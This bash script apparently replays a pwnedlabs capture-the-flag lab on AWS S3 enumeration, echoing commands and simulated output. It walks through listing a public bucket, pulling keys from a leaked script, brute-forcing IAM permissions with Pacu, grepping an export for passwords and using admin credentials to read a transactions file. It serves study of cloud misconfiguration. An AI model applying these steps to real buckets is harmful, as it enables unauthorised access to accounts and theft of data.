#!/bin/bash


# -------------------------- AWS S3 Enumeration basics ( pwnedlabs > Academy )
echo "AWS S3 Bucket Enumeration ---[ pwnedlabs ]" | lolcat
# provided with URL 
# website has input form > calculate cost > shows HTTP Error 405

# 405 Method Not Allowed
#  Code, Message, Method: POST, ResourceType: OBJECT, RequestId: 5GSHSGS5VS609IK, HostId: 5af1466fd26b9154bc647b73ee6b65225bfb340ace478b09ceb4a97c07a4278c

# view page source > https://s3.amazonaws.com/<provided url>/static/style.css

read -p "Enter profile name: " profile_name
echo "aws sts get-caller-identity --profile $profile_name" | lolcat
cat ./files/s3-user.txt
echo ""


# enumerate the S3 bucket
read -p "Enter URL for S3 bucket: " bucket

echo "aws s3 ls s3://$bucket --no-sign-request" | lolcat
sleep 3
echo "               PRE admin/"
echo "               PRE migration-files/"
echo "               PRE shared/"
echo "               PRE static/"
echo " 2023-10-16   5347 index.html/"
echo ""






read -p "Enter folder to enumerate: " folder
if [ $folder == "shared" ]; then
    echo "aws s3 ls s3://$bucket/$folder/ --no-sign-request" | lolcat
    sleep 2
    echo "2023-10-16 11:08:33        0"
    echo "2023-10-16 11:09:10      993 hl_migration_project.zip"
    echo ""
fi

if [ $folder == "admin" ]; then
    # read -p "Enter folder to enumerate: " folder
    echo "aws s3 ls s3://$bucket/$folder/ --no-sign-request" | lolcat
    sleep 3
    echo "An error occurred (AccessDenied) when calling ListObjectsV2 operations: Access Denied"
    echo ""
fi 


# get a copy of this file
read -p "Enter name of file to copy: " filename
echo "aws s3 cp s3://$bucket/$folder/$filename . --no-sign-request" | lolcat 

sleep 3
echo ""
#  unzip the file 
head -n 10 ./files/migrate_secrets.ps1
echo ""
echo ""


sleep 3
echo "--------------------"
head migrate_secrets.ps1 | grep -i "accessKey"
head migrate_secrets.ps1 | grep -i "secretKey"
head migrate_secrets.ps1 | grep -i "region"
echo ""

# start a new s3 session 
echo ""
read -p "Enter new profile name: " name
echo "aws configure --profile $name" | lolcat

read -p "AWS Access Key ID: " new_access_key
read -p "AWS Secret Access Key: " new_secret_key
read -p "Default region: " new_region
echo ""

echo "--------------[ pacu ]" | lolcat
echo "pacu"
read -p "name of new session: " new_session
echo "search iam"
sleep 2
echo "-------------------------------"
echo "iam_bruteforce_permissions"
echo "iam_decode_accesskey_id"
echo "iam_enum_action_query"
echo "iam_enum_permissions"
echo "iam_enum_users_roles_policies_groups"
echo "iam_get_credentials_report"
echo "-------------------------------"
echo ""

echo "run iam_enum_permissions" | lolcat
sleep 2
echo "0 Confirmed permissions for 0 user(s)"
echo "0 Confirmed permissions for 0 role(s)"
echo "0 Confirmed permissions for 0 user: pam-test"
echo "0 Confirmed permissions for 0 role(s)"
echo "Type 'whoami' to see detailed list of permissions"
echo ""

echo "iam_bruteforce_permissions --region us-east-1" | lolcat
sleep 3
cat ./files/pacu-bruteforce.txt
echo ""
echo ""



echo "aws sts get-caller-identity --profile $new_name"
echo "aws s3 ls s3://$bucket/ --profile $new_name"
read -p "Enter folder to enumerate: " folder
if [ "$folder" == "admin" ]; then 
    echo "aws s3 ls s3://$bucket/$folder/ --profile $new_name"
    sleep 2
    echo "2023-10-16 11:08:13     0 "
    echo "2024-12-02 08:28:18     32 flag.txt "
    echo "2023-10-16 16:58:33   2425 website_transactions.csv "
    echo ""
    read -p "Enter name of file to copy: " filename
    echo "aws s3 cp s3://$bucket/$folder/$filename . --no-sign-request" | lolcat 
    sleep 3
    echo "permission denied"

else 
    echo ""
fi

echo "aws s3 cp s3://$bucket/migration-files/text-export.xml"
cat ./files/text-export.xml | grep -i password

echo ""
echo "aws configure --profile admin"
echo "AWS Access Key ID: LODJD8SKS8SUSJAJQB"
echo "AWS Secret Access Key: ASS872HANAAH871181"
echo "Default region name: us-east-1"
echo "Default output format: json"
echo ""
echo ""

echo "aws sts get-caller-identity --profile admin"
sleep 2
echo "{"
echo "  \"UserId\": \"LODJD8SKS8SUSJAJQB\", "
echo "  \"Account\": \"8983737282822\", "
echo "  \"Arn\": \"arn:aws::iam::8983737282822:user/it-admin\", "
echo "}"

echo "aws s3 cp s3://$bucket/admin/website_transactions.csv . --profile admin"
sleep 2
head ./files/website_transactions.csv

